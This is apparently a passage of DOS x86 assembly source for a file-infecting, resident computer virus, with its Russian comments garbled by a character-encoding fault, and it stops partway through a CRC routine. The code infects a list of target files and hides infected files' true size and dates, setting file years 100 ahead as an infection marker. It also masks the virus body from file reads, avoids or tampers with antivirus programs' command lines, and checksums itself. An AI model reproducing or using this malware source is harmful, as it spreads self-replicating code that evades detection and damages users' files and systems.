   ; § à ¦¥¨¥ ¥ª®â®àëå ¦¨§¥® ¢ ¦ëå ä ©«®¢
   ; ¨á¯®«ì§ã¥â STACKS ¢ ª ç¥áâ¢¥ ¡ãä¥à  ¤«ï ¨¬¥ ä ©«®¢
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    FixVirus:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     si,2ch          ; ¯® á¬¥é¥¨î 2C ¢ PSP åà ¨âáï á¥£¬¥â
           mov     ds,cs:[si]      ; ®ªàã¦¥¨ï
           xor     si,si           ; ¯®¤£®â®¢ª  ª áª ¨à®¢ ¨î ®ªàã¦¥¨ï
           mvs     es,cs           ; ES:DI -> ¯ à ¬¥âà ®ªàã¦¥¨ï winbootdir
           lea     di,windows

    FxD:   call    compare         ; áà ¢¥¨¥ í«¥¬¥¨â  è ¡«®  winbootdir
           jz      FxedI           ; á ïç¥©ª®© ®ªàã¦¥¨ï ¯® DS:SI
           cmp     w [si],0        ; ¯à®¢¥àª    ®ª®ç ¨ï ¡«®ª  £«®¡ «ìëå
           jz      FxOUT           ; ¯ à ¬¥âà®¢
           inc     si              ; ¨ ç¥ ã¢¥«¨ç¥¨¥ ¨¤¥ªá  ®ªàã¦¥¨ï
           jmp     FxD             ; ¨áª âì ¤ «ìè¥

    FxedI: lodsb                   ; §¤¥áì ¥ â®«ìª® æ¨ª«, ® ¥é¥ á¢¥àåã ¥áâì JZ
           xor     al,'='          ; ¯®¨áª ®ª®ç ¨ï ¨¬¥¨ ¯¥à¥¬¥®©
           jnz     FxedI           ; '='

           mov     ah,60h          ; "TRUENAME" - CANONICALIZE FILENAME OR PATH
           lea     di,stacks       ; DS:SI - ¤¨à¥ªâ®à¨ï MD, ES:DI -  è ¡ãä¥à
           int     21h
           lea     di,stacks       ; DI - à¥§ã«ìâ â
           mvs     ds,cs           ; ãáâ ®¢ª  DS   á¥£¬¥â ¢¨àãá 
           xor     al,al           ; ¯®¨áª ã«ï ¢ à¥§ã«ìâ â 
           mov     cx,256          ; ¯®¨áª ¢ à ©®¥ 256-â¨ ¡ ©â
           cld
           repne   scasb
           jnz     FxOUT           ; ¢ëå®¤ ¢ á«ãç ¥ ®è¨¡ª¨

           dec     di              ; DI ãª §ë¢ ¥â   ®«ì ¢ ¤¨à¥ªâ®à¨¨
           cmp     b [di-1],'\'    ; ¯à®¢¥àª  ¤¢®©®£® \\
           jnz     $+3
           dec     di
           mov     bx,di           ; ¤ã¡«¨à®¢ ¨¥ ãª § â¥«ï
           lea     si,files        ; SI ãª §ë¢ ¥â   á¯¨á®ª ä ©«®¢ ¤«ï ¨ä¥ªâ 

    FxVI:  cmp     b [si],0        ; ¡®«ìè¥ ¥â ¦¥àâ¢?
           jz      FxOUT           ; ¢ íâ®¬ á«ãç ¥ ¢ëå®¤
           mov     di,bx           ; ª®¯¨à®¢ ¨¥ ¨¬¥¨ ®ç¥à¥à¥¤®©
           lodsb                   ; ¦¥àâ¢ë
           stosb
           or      al,al
           jnz     $-4

           mov     ax,1857h        ; ¢ë§®¢ ¢ãâà¥¥© äãªæ¨¨ ¢¨àãá 
           lea     dx,stacks       ; ¤«ï ¨ä¨æ¨à®¢ ¨ï ä ©«  ¯® DS:DX
           int     21h
           jmp     FxVI            ; ¢§ïâì á«¥¤ãîé¨© ä ©«

    FxOUT: call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Open/Close SFT - ¯®¤¯à®£à ¬¬  ¤«ï § ªàëâ¨ï/®âªàëâ¨ï ®à¬ «ì®© SFT
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    OpenSFT:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     si,0            ; "Open"
           jmp     Manipulate

    CloseSFT:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     si,1            ; "Close"

    Manipulate:
           mov     bp,bx           ; á®åà ¥¨¥ handle
           call    ioctl           ; ¯à®¢¥àª , íâ® ä ©« ¨«¨ chardevice
           jc      SFT_Error

           mov     ax,1220h        ; ¯®«ãç¥¨¥ JFT ¤«ï íâ®£® ä ©« 
           int     2fh
           jc      SFT_Error
           xor     bx,bx
           mov     bl,es:[di]      ; BL = System file entry
           cmp     bl,0ffh
           je      SFT_Error
           mov     ax,1216h        ; ¯®«ãç¥¨¥  ¤à¥á  SFT ¢ ES:DI
           int     2fh
           jc      SFT_Error

           mov     bx,bp           ; ¢®ááâ ®¢«¥¨¥ handle
           call    Inf_Check       ; ¯à®¢¥àª  ¨ä¨æ¨à®¢ ®áâ¨ ä ©« 
           jnc     SFT_Error       ; ¢ëå®¤ ¢ á«ãç ¥ ç¨áâ®£® ä ©« 

           mov     eax,vsize
           cmp     si,0            ; "Open"?
           jz      open
           neg     eax
    open:  add     es:[di+11h],eax ; á®åà ¥¨¥ ¢ SFT à §¬¥à 

           mov     dx,es:[di+0fh]  ; ¯®«ãç¥¨¥ ¤ âë ä ©« 
           call    hidestm         ; áªàëâ¨¥ «¨è¨å 100 «¥â
           cmp     si,0            ; "Open"?
           jnz     clsft
           ror     dh,1            ; ã¢¥«¨ç¥¨¥ ¤ âë ä ©« 
           add     dh,100
           rol     dh,1
    clsft: mov     es:[di+0fh],dx  ; á®åà ¥¨¥ ¨§¬¥¥®© ¤ âë

    SFT_Error:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; size stealth
   ; ES:SI -> „ â  ä ©« 
   ; ES:DI -> „«¨  ä ©« 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    sizst: mov     dx,es:[si]      ; dx = ¤ â  ä ©« 
           call    hidestm         ; ¬ áª¨à®¢ª  ¨ ¯à®¢¥àª  100 «¨è¨å «¥â
           jnc     oklen           ; ä ©« ¨ä¨æ¨à®¢ ?
           mov     W es:[si],dx    ; ãáâ ®¢¨âì ®à¬ «ìãî ¤ âã ä ©« 
           sub     W es:[di],vsize ; ¬ áª¨à®¢ª  ¯à¨à é¥¨ï ¤«¨ë ä ©« 
           sbb     W es:[di+2],0
    oklen: ret

    hidestm:
           push    dx              ; á®åà ¨âì ¤ âã ¢ áâ¥ª¥
           shr     dh,1            ; ¯®«ãç¨âì £®¤ ä ©« 
           cmp     dh,100          ; áà ¢¥¨¥ ¥£® á 100
           pop     dx              ; ¢®ááâ ®¢¨âì ¤ âã
           jb      okinf
           ror     dh,1            ; ¯®«ãç¨âì £®¤ ä ©« 
           sub     dh,100          ; á¯àïâ âì «¨è¥¥
           rol     dh,1            ;
           stc                     ; ä ©« § à ¦¥!
           ret
    okinf: clc
           ret

    correctdate:
           mov     ax,5700h        ; ãáâ ®¢ª  ¤ âë ä ©«  ¢ § ¢¨á¨¬®áâ¨
           call    int21           ; ®â â®£®, § à ¦¥ «¨ ®
           call    HideStm         ; ®à¬ «ì ï ¤ â 
           call    Inf_Check       ; ¯à®¢¥à¨âì ä ©«   § à ¦¥®áâì
           jnc     okdat
           ror     dh,1
           add     dh,100
           rol     dh,1
    okdat: mov     ax,5701h        ; ãáâ ®¢ª  ®âª®àà¥ªâ¨à®¢ ®©
           call    int21           ; ¤ âë ä ©« 
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; *à®¢¥àª  ¨¬¥¨ ä ©«  (AVs)
   ; *à®¢¥àª  à áè¨à¥¨ï ä ©«  (Extens)
   ; *à¨ SAVE_AX=4B00 ¤®¡ ¢«¥¨¥ ¯ à ¬¥âà®¢ ¢ cmdline
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Filename:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           cld

           mov     si,dx           ; á¬¥é¥¨¥ ¨¬¥¨ ¢ ¨¤¥ªáë© à¥£¨áâà
    nfind: lodsb                   ; ¯®¨áª ¨¬¥¨ ä ©« 
           cmp     al,':'          ; ¢  è¥¬ á«ãç ¥ ®® ¡ã¤¥â á«¥¤®¢ âì
           jz      separ           ; §  ¯®á«¥¤¨¬ "/", "\", ":"
           cmp     al,'\'
           jz      separ
           cmp     al,'/'
           jnz     store
    separ: mov     dx,si           ; á®åà ¨âì á¬¥é¥¨¥

    store: or      al,al           ; ¯à®¢¥àª  ª®æ  áâà®ª¨ (0)
           jnz     nfind

           mov     si,dx           ; SI -> ¨¬ï ä ©« 
           xor     di,di           ; à áè¨à¥¨¥ ¯®ª  ¥  ©¤¥®
    gext:  lodsb
           cmp     al,'.'          ; à áè¨à¥¨¥?
           jnz     $+4
           mov     di,si
           or      al,al
           jnz     gext
           or      di,di           ; ¥á«¨ â®ç¥ª ¢ ¨¬¥¨ ä ©« 
           jz      Bad_File        ; ®¡ àã¦¥® ¥ ¡ë«®

           lea     bp,[di-1]       ; á¥©ç á BP-à áè¨à¥¨¥ ä ©« , DX-¥£® ¨¬ï
           mvs     es,cs           ; ES=CS

           cmp     cs:save_ax,4b00h
           jne     no_add
           mov     si,dx           ; SI -> ¨¬ï ä ©« 
           lea     di,prms         ; â ¡«¨çª  (ä®à¬ â: avname,0,0,cmdline,0dh)

    scancmd:
           call    compare         ; áà ¢¥¨¥ ¨¬¥¨ § ¯ãáª ¥¬®© ¯à®£à ¬¬ë
           jz      addprm          ; á ¯à¥¤ãá¬®âà¥ë¬ ¨¬¥¥¬ ¨§ â ¡«¨æë
           mov     al,0dh
           mov     cx,0ffffh
           repne   scasb
           cmp     b cs:[di],0     ; ª®¥æ â ¡«¨æë?
           jnz     scancmd         ; ¢ â ¡«¨æ¥ ¨¬ï ¥  ©¤¥® - § ¯ãé¥ 
           jmp     no_add          ; ¤àã£ ï ¯à®£à ¬¬ 

    addprm:
           push    es              ; á®åà ¥¨¥ ES
           mov     al,0
           mov     cx,0ffffh
           repne   scasb
           lea     si,[di+1]
           les     bx,d cs:save_bx ; § £àã§ª  ¢ ES:BX  ¤à¥á  EPB
           les     bx,es:[bx+2]    ; § £àã§ª   ¤à¥á  ª®¬ ¤®© áâà®ª¨ ¢ ES:BX
           mov     di,bx
    getdx: inc     di              ; áª ¨àã¥¬ ª®¬ ¤ãî áâà®ªã
           cmp     b es:[di],0dh   ; ª®¥æ áâà®ª¨?
           jnz     getdx
           mov     cx,-1           ; áç¥âç¨ª ¤«¨ë ¤®¯®«¨â¥«ì®£® ¯ à ¬¥âà 
           lods    b cs:[si]       ; § £àã§ª  ¡ ©â  ¯ à ¬¥âà 
           stosb                   ; á®åà ¥¨¥ ¡ ©â  ¯ à ¬¥âà 
           inc     cx              ; ã¢¥«¨ç¥¨¥ áç¥âç¨ª 
           cmp     al,0dh          ; ¯à®¢¥àª    ®ª®ç ¨¥ ¯ à ¬¥âà 
           jnz     $-6
           add     es:[bx],cl      ; ã¢¥«¨ç¥¨¥ ¤«¨ë ª®¬ ¤®© áâà®ª¨
           pop     es              ; ¢®ááâ ®¢«¥¨¥ ES

    no_add:
           mov     si,bp
           lea     di,extens       ; ES:DI ãª §ë¢ îâ   â ¡«¨æã á
           call    compare         ; à §à¥è¥ë¬¨ à áè¨à¥¨ï¬¨
           jnz     Bad_File        ; ¥ª®àà¥ªâ®¥ à áè¨à¥¨¥?

           mov     al,[si+1]       ; § £àã§ª  ¯¥à¢®£® ¡ ©â  à áè¨à¥¨ï
           call    upreg           ; ¯¥à¥¢®¤ ¢ ¢¥àå¨© à¥£¨áâà
           mov     cs:host,al      ; ãáâ ®¢ª  ä« £ 

           mov     si,dx           ; SI -> ¨¬ï ä ©« 
           lea     di,AVs          ; ES:DI -> â ¡«¨æ  á ¨¬¥ ¬¨
           call    compare         ; áà ¢¥¨¥ ¨¬¥
           jz      Bad_File        ; ¥•®*®è¥¥ ¨¬ï

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           clc                     ; ®ç¨áâª  CF
           ret

    Bad_File:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           stc                     ; ãáâ ®¢ª  CF
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ãáâ ®¢ª  ¡ ©â  STF ¢ § ¢¨á¨¬®áâ¨ ®â â¥ªãé¥£® PSP/MCB
   ; ¡ ©â à ¢¥ 1 ¥á«¨ â¥ªãé¨© MCB ¯à¨ ¤«¥¦¨â ¯à®£à ¬¬¥ ¨§ STLOCK
   ; ¡ ©â à ¢¥ 0 ¥á«¨ ¢« ¤¥«¥æ â¥ªãé¥£® MB ¥ § à¥£¨áâà¨à®¢  ¢ STLOCK
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    mcbcheck:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢

           mov     ah,62h          ; § ¯à®á á¥£¬¥â  â¥ªãé¥£® PSP
           call    int21
           dec     bx              ; ¯®«ãç¥¨¥ á¥£¬¥â  MCB
           mov     ds,bx           ; DS:SI ãª §ë¢ îâ   ¢« ¤¥«ìæ  MB
           mov     si,08h          ;
           lea     di,stlock       ; ES:DI ãª §ë¢ îâ    è
           mvs     es,cs           ; á¯¨á®ª ¨¬¥ STLOCK
           call    compare         ; áà ¢¥¨¥ ¤ ëå
           sete    cs:stf          ; ãáâ ®¢ª  áâ¥«á-ä« £ 

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; COMPARE - áà ¢¥¨¥ ¤ ëå
   ; DS:SI - ¨áâ®ç¨ª
   ; ES:DI - â ¡«¨æ  (Data1,0,Data2,0,...,DataN,0,0)
   ; ‚ëå®¤: ZF = 1 ¢ á«ãç ¥ á®¢¯ ¤¥¨ï ¤ ëå
   ; *¥£¨áâà « â¨áª¨å ¡ãª¢ § ç¥¨ï ¥ ¨¬¥¥â
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    compare:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     dx,si           ; ¤ã¡«¨à®¢ ¨¥ á¬¥é¥¨ï ¨áâ®ç¨ª 

    data1: mov     si,dx           ; ¢®ááâ ®¢«¥¨¥ á¬¥é¥¨ï ¨áâ®ç¨ª 
    data2: mov     al,ds:[si]      ; çâ¥¨ï ¡ ©â  ¨áâ®ç¨ª 
           mov     ah,es:[di]      ; çâ¥¨ï ¡ ©â  â ¡«¨æë
           inc     di              ; ã¢¥«¨ç¥¨¥ ¨¤¥ªáëå à¥£¨áâà®¢
           inc     si              ;
           call    upreg           ; ¯¥à¥¢®¤ á¨¬¢®«®¢ ¢ ¢¥àå¨© à¥£¨áâà
           or      ah,ah           ; ¥á«¨ ¢ â ¡«¨æ¥ ®¡à §®¢ «áï 0 =>
           jz      equal           ; => ¤ ë¥ á®¢¯ «¨
           cmp     al,ah           ; ¨ ç¥ ¯®¡ ©â®¥ áà ¢¥¨¥
           jz      data2           ; ¥á«¨ ¡ ©âë á®¢¯ «¨, ¯à®¢¥àï¥¬ ¤ «ìè¥

    data3: cmp     B es:[di],0     ; ¡ë©âë ¥ á®¢¯ «¨, ¡¥à¥¬ á«¥¤ãîé¥¥
           jz      data4           ; ¯®«¥
           inc     di
           jmp     data3

    data4: inc     di
           cmp     B es:[di],0     ; ¯à®¢¥àª    ¯®á«¥¤îî § ¯¨áì ¢
           jnz     data1           ; â ¡«¨æ¥

           call    LoadRegs        ; â ¡«¨æ  ª®ç¨« áì: á®¢¯ ¤¥¨© ¥  ©¤¥®
           cmp     di,-1           ; ®ç¨áâª  ZF
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

    equal: call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           cmp     al,al           ; ãáâ ®¢ª  ZF
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Gets a random value [0..AX]
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    xrandom:
           push    bx cx dx si di
           mov     si,ax
           mov     ax,cs:random1
           mov     bx,cs:random2
           mov     cx,ax
           mov     di,8405h
           mul     di
           shl     cx,3
           add     ch,cl
           add     dx,cx
           add     dx,bx
           shl     bx,2
           add     dx,bx
           add     dh,bl
           shl     bx,5
           add     dh,bl
           add     ax,1
           adc     dx,0
           mov     cs:random1,ax
           mov     cs:random2,dx
           or      si,si
           jz      rnd_exit

           xor     dx,dx
           div     si
           xchg    ax,dx
    rnd_exit:
           pop     di si dx cx bx
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬ë ¤«ï ãáâ ®¢ª¨/áïâ¨ï ¢¥ªâ®à  ¯à¥àë¢ ¨ï
   ; ªà¨â¨ç¥áª¨å ®è¨¡®ª int 24h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Hook24:
           call    SaveRegs        ; á®åà ¥¨¥ ¨ ¯¥à¥å¢ â
           xor     ax,ax           ; ¢¥ªâ®à  ¯à¥àë¢ ¨ï ªà¨â¨ç¥áª¨å
           mov     ds,ax           ; ®è¨¡®ª int 24h
           mov     si,24h*4
           mov     dx,cs
           lea     ax,int24
           xchg    ax,[si]
           xchg    dx,[si+2]
           mov     cs:io24,ax
           mov     cs:io24+2,dx
           call    LoadRegs
           ret

    Remove24:
           call    SaveRegs        ; ¢®ááâ ®¢«¥¨¥ ¢¥ªâ®à  int 24h
           xor     ax,ax
           mov     ds,ax
           mov     si,24h*4
           mov     ax,cs:io24
           mov     dx,cs:io24+2
           mov     [si],ax
           mov     [si+2],dx
           call    LoadRegs
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬ë ¤«ï à ¡®âë á ä ©« ¬¨
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    RestoreFileAttributesA:
           push    ax bx cx dx ds
           mov     ax,7143h
           mov     cx,4301h
           mov     bx,1
           call    LFNAPI_Check
           mov     dx,cs:fn_ptr
           mov     ds,cs:fn_ptr+2
           mov     cx,cs:Attrib
           test    cl,1
           jz      noRFA
           call    int21
    noRFA: pop     ds dx cx bx ax
           ret

    ClearFileAttributesA:
           push    ax bx cx dx
           mov     ax,7143h
           xor     bx,bx
           mov     cx,4300h
           call    LFNAPI_Check
           call    int21
           jc      NoFA
           mov     cs:Attrib,cx
           mov     cs:fn_ptr,dx
           mov     cs:fn_ptr+2,ds
           test    cl,1
           jz      NoFA
           mov     ax,7143h
           mov     bx,1
           mov     cx,4301h
           call    LFNAPI_Check
           mov     cx,20h
           call    int21
           jc      NoFA
    NoFA:  pop     dx cx bx ax
           ret

    CreateFileA:
           push    ax cx dx si
           mov     ax,716ch
           mov     cx,6c00h
           call    LFNAPI_Check
           mov     bx,2
           xor     cx,cx
           mov     si,dx
           mov     dx,1
           call    int21
           xchg    ax,bx
           pop     si dx cx ax
           ret

    LFNAPI_Check:
           push    ax cx bx
           mov     ax,71a1h
           mov     bx,-1
           call    int21
           or      al,al
           jz      noLFNAPI
           pop     bx cx ax
           ret
    noLFNAPI:
           pop     bx ax cx
           ret

    GetDate:                       ; ¯®«ãç¥¨¥ ¢à¥¬¥¨ ¨ ¤ âë
           mov     ax,5700h        ; ¯®á«¥¤¥© § ¯¨á¨ ¢ ä ©«
           call    int21
           mov     cs:time,cx
           mov     cs:date,dx
           ret

    RestDate:                      ; ¢®ááâ ®¢«¥¨¥ ¢à¥¬¥¨ ¨ ¤ âë
           mov     ax,5701h        ; ä ©« 
           mov     cx,cs:time
           mov     dx,cs:date
           call    int21
           ret

    Write: mov     ah,40h          ; § ¯¨áì ¢ ä ©«
           call    int21
           ret

    Read:  mov     ah,3fh          ; çâ¥¨¥ ¨§ ä ©« 
           call    int21
           ret

    CloseFile:
           mov     ah,3eh          ; § ªàëâ¨¥ ä ©« 
           call    int21
           ret

    SeekSave:
           call    SaveRegs        ; á®åà ¥¨¥ ¯®§¨æ¨¨
           xor     cx,cx           ; ãª § â¥«ï (lseek) ¢ ä ©«¥
           xor     dx,dx
           call    seekfrom_cur
           mov     cs:seek_pos,ax
           mov     cs:seek_pos+2,dx
           call    LoadRegs
           ret

    RestoreSeek:
           call    SaveRegs        ; ¢®ááâ ®¢«¥¨¥ á®åà ¥®©
           mov     dx,cs:seek_pos  ; ¯®§¨æ¨¨ ãª § â¥«ï   ä ©«¥
           mov     cx,cs:seek_pos+2
           call    seekfrom_bof
           call    LoadRegs
           ret

    seek2bof:
           mov     ax,4200h        ; ãáâ ®¢ª  ãª § â¥«ï  
           xor     cx,cx           ;  ç «® ä ©« 
           xor     dx,dx
           jmp     realseek

    seek2eof:
           mov     ax,4202h        ; ãáâ ®¢ª  ãª § â¥«ï  
           xor     cx,cx           ; ª®¥æ ä ©« 
           xor     dx,dx
           jmp     realseek

    seekfrom_eof:
           mov     ax,4202h        ; ãáâ ®¢ª  ãª § â¥«ï
           jmp     realseek        ; ®â ª®æ  ä ©« 

    seekfrom_cur:
           mov     ax,4201h        ; ãáâ ®¢ª  ãª § â¥«ï
           jmp     realseek        ; ®â â¥ªãé¥© ¯®§¨æ¨¨

    seekfrom_bof:
           mov     ax,4200h        ; ãáâ ®¢ª  ãª § â¥«ï
                                   ; ®â  ç «  ä ©« 
    realseek:
           call    int21
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ®¡à ¡®âç¨ª int 24h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    int24: mov     al,3            ; Fail caller
           iret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯á¥¢¤® int 21h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    int21: pushf                   ; § ®á ¢ áâ¥ª ä« £®¢ ¨ ª®¤®¢®£®
           push    cs              ; á¥£¬¥â 
           call    exithandler     ; ã¯à ¢«¥¨¥ ¢¥à¥âáï ¯®  ¤à¥áã ¢ áâ¥ª¥
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª  ä ©«  (¤¨áª®¢ë©?)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    ioctl: push    ax dx           ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     ax,4400h        ; IOCTL - GET DEVICE INFORMATION
           call    int21
           jc      chkd            ; DOS ¢¥àã« á®®¡é¥¨¥ ®¡ ®è¨¡ª¥
           sub     dl,10000000b    ; ¯à®¢¥àª  ¡¨â  ®¬¥à 7
           cmc
    chkd:  pop     dx ax
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯¥à¥¢®¤ ¤¢ãå « â¨áª¨å á¨¬¢®«®¢ ¢ AH ¨ AL ¢ ¢¥àå¨© à¥£¨áâà
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    upreg: xchg    al,ah           ; ¬¥ï¥¬ ¬¥áâ ¬¨ AL ¨ AH
           call    upral           ; ¯¥à¥¢®¤¨¬ ¢ ¢¥àå¨© à¥£¨áâà ¡ë¢è¨© AH
           xchg    al,ah           ; ¢®ááâ  ¢«¨¢ ¥¬ ¯®«®¦¥¨¥ AL ¨ AH
           call    upral           ; ¯¥à¥¢®¤¨¬ ¢ ¢¥àå¨© à¥£¨áâà AL
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

    upral: cmp     al,'a'          ; ¯à®¢¥àª     å®¦¤¥¨¥ AL
           jb      noupr           ; ¢ ¨â¥à¢ «¥ ®â 61h ¤® 74h
           cmp     al,'z'
           ja      noupr
           sub     al,20h          ; ¯¥à¥¢®¤ ¢ ¢¥àå¨© à¥£¨áâà
    noupr: ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; SeekHide
   ; ¥á«¨ ¯®§¨æ¨ï lseek  å®¤¨âáï   â¥«¥ ¢¨àãá , ¯®¤¯à®£à ¬¬  ¯¥à¥®á¨â ¥£®
   ;   £à ¨æã ¢¨àãá  ¨ § à ¦¥®© ¯à®£à ¬¬ë, â.¥.   ª®¥æ ç¨áâ®© ¯à®£à ¬¬ë
   ; SEEK_POS á®¤¥à¦ â ®¢ãî ¯®§¨æ¨î lseek
   ; NRBYTES ã¬¥ìè ¥âáï   à §®áâì ¤¢ãå ¯®§¨æ¨©
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seekhide:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           call    SeekSave        ; á®åà ï¥¬ â¥ªãé¥¥ ¯®«®¦¥¨¥ ãª § â¥«ï
           mov     cx,-1           ; ¤¢¨£ ¥¬ ãª § â¥«ì   £à ¨æã ¢¨àãá  ¨
           mov     dx,-vsize       ; ¯à®£à ¬¬ë
           call    seekfrom_eof    ; DX:AX - £®«®¢  ¢¨àãá 
           sub     ax,cs:seek_pos  ; SEEK_POS - áâ à ï ¯®§¨æ¨ï
           sbb     dx,cs:seek_pos+2
           cmp     dx,-1           ; DX:AX ¤®«¦® ¡ëâì ®âà¨æ â¥«ìë¬
           jnz     not_us
           or      ax,ax
           jns     not_us
           neg     ax              ; ¯®«ãç¥¨¥ à §®áâ¨ ¯®§¨æ¨©
           sub     cs:nrbytes,ax   ; ã¬¥ìè¥¨¥ ª®«¨ç¥áâ¢  ¯à®ç¨â ëå ¡ ©â®¢
           sub     cs:seek_pos,ax  ; ã¬¥ìè¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï ¢ ä ©«¥
           sbb     cs:seek_pos,0   ; â.¥. á¬¥é¥¨¥ ¥¥   £®«®¢ã ¢¨àãá 
    not_us:
           call    RestoreSeek     ; ¢®ááâ ®¢«¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤áç¥â CRC ¢¨àãá 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    crc:   push    si cx
           lea     si,shield
           mov     cx,end_crc-shield
           call    crc32
           pop     cx si
           ret

    CRC32: push    ebx ecx edx esi edi ds
           cld
           mov     di,cx
           mov     ecx,-1
           mov     edx,ecx
           mvs     ds,cs

      NextByteCRC:
           xor     eax,eax
           xor     ebx,ebx
           lodsb
           xor     al,cl
           mov     cl,ch
           mov     ch,dl
           mov     dl,dh
           mov     dh,8
      NextBitCRC:
           shr     bx,1
           rcr     ax,1
           jnc     NoCRC
